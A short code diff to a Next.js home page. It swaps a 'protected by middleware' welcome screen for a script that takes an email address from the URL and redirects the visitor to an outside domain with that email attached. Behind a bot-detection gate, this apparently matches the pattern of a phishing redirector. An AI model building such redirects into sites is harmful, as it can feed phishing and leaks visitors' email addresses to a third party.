@@ -1,8 +1,17 @@
+'use client';
+import { useEffect } from 'react';
+import { useSearchParams } from 'next/navigation';
+
 export default function Home() {
-  return (
-    <main>
-      <h1>JS detected — Welcome!</h1>
-      <p>This page is protected by middleware.</p>
-    </main>
-  );
+  const searchParams = useSearchParams();
+
+  useEffect(() => {
+    const email = searchParams.get('e');
+    const target = email
+      ? `https://fewdomain.com?e=${encodeURIComponent(email)}`
+      : 'https://fewdomain.com';
+    window.location.href = target;
+  }, [searchParams]);
+
+  return <p>Redirecting to destination...</p>;
 }
